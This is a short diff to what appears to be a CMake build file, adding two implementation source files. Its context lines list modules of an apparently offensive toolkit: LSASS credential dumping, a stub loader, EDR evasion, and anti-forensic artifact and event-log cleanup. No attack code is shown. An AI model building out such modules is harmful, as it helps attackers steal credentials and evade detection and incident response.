@@ -29,6 +29,7 @@ set(FORENSIC_SOURCES
     forensics/forensic_engine.c
     forensics/forensics_rt.c
     forensics/forensic_utils.c
+    forensics/forensic_api_impl.c
     forensics/jocky_forensics_rt_v2.c
     forensics/audit/audit_log.c
     forensics/control/capabilities.c
@@ -116,6 +117,7 @@ set(WINDOWS_SOURCES
     exfil/lsass_dump.c
     pack/stub_loader.c
     win_wrapper.c
+    windows/windows_api_impl.c
     windows/evasion/edr_throttle_profiler.c
     windows/anti_forensics/cleanup_artifacts.c
     windows/anti_forensics/event_log_cleanup.c
